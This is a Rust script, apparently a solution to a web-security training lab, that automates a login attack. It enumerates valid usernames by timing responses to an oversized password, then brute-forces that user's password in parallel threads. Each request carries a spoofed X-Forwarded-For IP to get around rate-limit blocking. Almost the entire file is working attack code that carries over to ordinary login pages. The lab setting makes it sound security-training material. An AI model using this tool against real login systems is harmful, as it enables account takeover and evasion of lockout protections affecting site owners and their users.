/****************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 27/8/2023
*
* Lab: Username enumeration via response timing
*
* Steps: 1. Enumerate a valid username via response timing
*        2. Brute force password of that valid username
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use atomic_counter::{self, RelaxedCounter};
use lazy_static::lazy_static;
use rand::Rng;
use rayon::{
    current_thread_index,
    prelude::{IntoParallelRefIterator, ParallelIterator},
    ThreadPool,
};
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    ops::Add,
    process,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Global variables
*******************/
lazy_static! {
    static ref VALID_USER: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref VALID_PASSWORD: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref FAILED_USERS: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    static ref FAILED_PASSWORDS: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    static ref USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref FAILED_USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref FAILED_PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
}

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0abe0006040e351c82879dca001400df.web-security-academy.net/login"; 
    
    // build the client that will be used for all subsequent requests
    let client = build_client(); 

    // read usernames as one big string
    // change the path to your usrename list
    let usernames_big_string = fs::read_to_string("/home/ahmed/users").unwrap();
    
    // split the big string to a list of usernames
    // change the separator to \r\n if you are still a windows user
    let usernames = usernames_big_string.split("\n").collect(); 

    // read passwords as one big string
    // change the path to your password list
    let passwords_big_string = fs::read_to_string("/home/ahmed/passwords").unwrap();
    
    // split the big string to a list of passwords
    // change the separator to \r\n if you are still a windows user
    let passwords = passwords_big_string.split("\n").collect(); 

    // capture the time before brute forcing
    let start_time = time::Instant::now(); 

    // start enumeration
    // 8 is the number of threads, you can chagne it
    enum_usernames(start_time, url, &client, usernames, 8); 

    // if a valid username is found
    if VALID_USER.lock().unwrap().len() != 0 {
        // start brute force his password
        // 8 is the number of threads, you can change it
        brute_force_password(
            start_time,
            url,
            &client,
            passwords,
            VALID_USER.lock().unwrap().as_str(),
            8, 
        );

        // if a valid password is found
        if VALID_PASSWORD.lock().unwrap().len() != 0 {
            print_valid_credentials();
        } else {
            println!("\n{}", "[!] Couldn't find valid password".red());
        }
    } else {
        println!("\n{}", "[!] Couldn't find valid username".red());
    }
    
    // print some useful information to the terminal
    print_finish_message(start_time); 
    
    // some request will be failed due to unknow reseaon
    // print them after you finish to try them latere
    print_failed_requests(); 
    
    // save results  to a file in the current working directory
    // you can change this name to what you want
    save_results(start_time, "results"); 
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .timeout(Duration::from_secs(15))
        .redirect(Policy::none())
        .build()
        .unwrap()
}

/***********************************************************************
* Function used to enumerate usernames
* Parameters:
    - Instant:   to ouptut an updated elapsed time to the terminal
    - URL: the URL of the lab
    - client: the client we build using the build_client() function
    - usernames: the list of gathered usernames
    - threads: the number of threads you want the enumeration to run in
************************************************************************/
fn enum_usernames(
    start_time: Instant,
    url: &str,
    client: &Client,
    usernames: Vec<&str>,
    threads: usize,
) {
    println!("[#] Enumerate usernames..");
    
    // how many users will be tried in each thread
    let chunk_per_thread = usernames.len() / threads; 
    
    // split the whole list to sublist to run each one in a thread
    let usernames_chunks: Vec<_> = usernames.chunks(chunk_per_thread).collect();
    
    // the pattern to search for in the response
    let regex = Regex::new("Invalid username").unwrap(); 

    // run every sublist in a thread
    usernames_chunks.par_iter().for_each(|mini_list| {
        // get the total count of the usernamse
        let total_counts = usernames.iter().count();

        // iterate over every sublist in its corresponding thread
        for (index, user) in mini_list.iter().enumerate() {
            // iterate only if no valid user is found
            if VALID_USER.lock().unwrap().len() == 0 {
                // get number of succeeded requests
                let success_counter = USERS_COUNTER.fetch_add(0, Ordering::Relaxed); 
                
                // get number of failed requests
                let fail_counter = FAILED_USERS_COUNTER.fetch_add(0, Ordering::Relaxed); 

                // calculat the elapsed time
                let elapsed_time = start_time.elapsed().as_secs() / 60;
                
                // print the progress based on the updated informations
                print_progress(
                    elapsed_time,
                    fail_counter,
                    success_counter,
                    total_counts,
                    user,
                );

                // set a big random password to make server take more time in computing
                let big_password = "frajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfw";
                
                // the data sent in the POST login request
                let data = HashMap::from([("username", user), ("password", &big_password)]);

                // capture the time before making the request 
                let mut request_start_time = Instant::now();
                
                // try to login
                // change IP in every request to avoid blocking
                let mut login = client.post(url)
                    .form(&data)
                    .header("X-Forwarded-For", get_random_ip())
                    .send(); 

                // if the requset is successful
                if let Ok(res) = login {
                    // calculate the time completion of the request
                    let request_elapsed_time = request_start_time.elapsed().as_secs(); 
                    
                    // add 1 to the succeeded counter
                    USERS_COUNTER.fetch_add(1, Ordering::Relaxed); 
                    
                    // if the response take more than 5 seconds; an indicator of a success username
                    if request_elapsed_time > 5 { 
                        // change this global varaible to the valid user
                        // this is the thread-safe operation using mutexes
                        VALID_USER.lock().unwrap().push_str(user); 
                    }
                } else {
                    // if the request faild for unknown reason try to send it again
                    let request_elapsed_time = request_start_time.elapsed().as_secs();

                    login = client.post(url)
                        .form(&data)
                        .header("X-Forwarded-For", get_random_ip())
                        .send(); 

                    if let Ok(res) = login {
                        let request_elapsed_time = request_start_time.elapsed().as_secs();
                        
                        USERS_COUNTER.fetch_add(1, Ordering::Relaxed);
                        
                        if request_elapsed_time > 5  {
                            VALID_USER.lock().unwrap().push_str(user);
                        }
                    } else {
                        // if the second try to send the request also faild
                        // add 1 to failed counter
                        FAILED_USERS_COUNTER.fetch_add(1, Ordering::Relaxed); 
                        // save this user to a list to try it later
                        FAILED_USERS.lock().unwrap().push(user.to_string()); 
                    }
                }
            } else {
                // if a valid username is found, this whill cause all threads to be terminated
                return; 
            }
        }
    });
}

/***********************************************************************
* Function used to brute force passowrd
* Parameters:
    - Instant: to ouptut an updated elapsed time to the terminal
    - URL: the URL of the lab
    - client: the client we build using the build_client() function
    - passwords: the list of gathered usernames
    - valid user: the valid user to brute force his password
    - threads: the number of threads you want the enumeration to run in
************************************************************************/
fn brute_force_password(
    start_time: Instant,
    url: &str,
    client: &Client,
    passwords: Vec<&str>,
    valid_user: &str,
    threads: usize,
) {
    println!("");
    println!(
        "{}: {}",
        "✅ Valid user".white().bold(),
        valid_user.green().bold()
    );
    println!("[#] Brute forcing password..");
    
    // how many passwords will be tried in each thread
    let chunk_per_thread = passwords.len() / threads; 
    
    // split the whole list to sublist to run each one in a thread
    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect(); 

    // run every sublist in a thread
    passwords_chunks.par_iter().for_each(|mini_list| {
        // get total number of passwords that will be tried
        let total_counts = passwords.iter().count(); 

        // iterate over every sublist in its corresponing thread
        for (index, password) in mini_list.iter().enumerate() {
            // iterate only if no valid password is found
            if VALID_PASSWORD.lock().unwrap().len() == 0 {
                // update the success counter to output in the terminal
                let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed); 
                
                // update the failed counter to output in the terminal
                let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed); 

                // calculate the elapsed time
                let elapsed_time = start_time.elapsed().as_secs() / 60;

                // print the updated information to the terminal
                print_progress(
                    elapsed_time,
                    fail_counter,
                    success_counter,
                    total_counts,
                    password,
                );
                
                // the POST date to submit
                let data = HashMap::from([("username", valid_user), ("password", password)]); 
                
                // try to login
                // change IP in every request to avoid blocking
                let mut login = client
                    .post(url)
                    .form(&data)
                    .header("X-Forwarded-For", get_random_ip()) 
                    .send(); 
                
                // if the request succeeded
                if let Ok(res) = login {
                    // if the password is true
                    if res.status().as_u16() == 302 {
                        // update the global variable to the valid password
                        // this is a thread-safe operation using mutexes
                        VALID_PASSWORD.lock().unwrap().push_str(password) 
                    }
                } else {
                    // if the request faild for unknown reason try to send it again
                    login = client
                        .post(url)
                        .form(&data)
                        .header("X-Forwarded-For", get_random_ip())
                        .send();
                    
                    if let Ok(res) = login {
                        if res.status().as_u16() == 302 {
                            VALID_PASSWORD.lock().unwrap().push_str(password)
                        }
                    } else {
                        // if the repeated request also failed,
                        // upate the counter and save the password to try it later
                        FAILED_PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
                        FAILED_PASSWORDS.lock().unwrap().push(password.to_string());
                    }
                }
            } else {
                return;
            }
        }
    });
}

/*************************************
* Function used print the update info
* to the terminal in a nice format
**************************************/
#[inline(always)]
fn print_progress(
    elapsed_time: u64,
    fail_counter: usize,
    success_counter: usize,
    total_counts: usize,
    text: &str,
) {
    print!(
        "\r{}: {:3} minutes || {}: {:3} || {} ({}/{}): {:50}",
        "Elapsed".yellow().bold(),
        elapsed_time,
        "Failed".red().bold(),
        fail_counter,
        "Trying".white().bold(),
        success_counter,
        total_counts,
        text.blue().bold()
    );
    io::stdout().flush().unwrap();
}

/********************************************************
* Function used to print the valid username and password
*********************************************************/
fn print_valid_credentials() {
    println!(
        "\n{}: username: {}, password: {}",
        "✅ Login successfully".white(),
        VALID_USER.lock().unwrap().green().bold(),
        VALID_PASSWORD.lock().unwrap().green().bold()
    );
}
/********************************************************
* Function used to print finish time
*********************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}
/****************************************************
* Function used print failed usernames and password
* that we tried 2 times earlier and also failed
*****************************************************/
#[inline(always)]
fn print_failed_requests() {
    let failed_users = FAILED_USERS.lock().unwrap();
    println!(
        "\n\n{}: {} \n{}: {:?}",
        "[!] Failed users count".red().bold(),
        failed_users.len().to_string().yellow().bold(),
        "[!] Failed users".red().bold(),
        failed_users
    );
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    println!(
        "\n\n{}: {} \n{}: {:?}",
        "[!] Failed password count".red().bold(),
        failed_passwords.len().to_string().yellow().bold(),
        "[!] Failed password".red().bold(),
        failed_passwords
    )
}

/*********************************************
* Function used to save results to a txt file
**********************************************/
fn save_results(start_time: Instant, file_name: &str) {
    let failed_users = FAILED_USERS.lock().unwrap();
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    let valid_user = VALID_USER.lock().unwrap();
    let valid_pass = VALID_PASSWORD.lock().unwrap();
    let to_save = format!(
        "✅ Finished in: {elapsed_time:?} minutes \n\n\
    Username: {user}, Password: {pass} \n\n\
    [!] Failed users count: {fusers_count} \n\
    [!] Failed users: {fusers:?} \n\n\
    [!] Failed passwords count: {fpasswords_count} \n\
    [!] Failed passwords: {fpasswords:?} \n\n",
        elapsed_time = start_time.elapsed().as_secs() / 60,
        fusers_count = failed_users.len(),
        fusers = failed_users,
        fpasswords = failed_passwords,
        fpasswords_count = failed_passwords.len(),
        user = valid_user,
        pass = valid_pass
    );
    let new_file = fs::File::create(file_name);
    if let Ok(mut file_created) = new_file {
        write!(file_created, "{}", to_save);
        println!(
            "\n{}: {}",
            "Restults was saved to".yellow().bold(),
            file_name.green().bold()
        )
    } else {
        println!("\n{}", "[!] Couldn't create new file to save results".red());
    }
}

/*************************************************
* Function used to generate random IP on each call
**************************************************/
fn get_random_ip() -> String {
    let a = rand::thread_rng().gen_range(2..254);
    let b = rand::thread_rng().gen_range(2..254);
    let c = rand::thread_rng().gen_range(2..254);
    let d = rand::thread_rng().gen_range(2..254);
    format!("{a}.{b}.{c}.{d}")
}
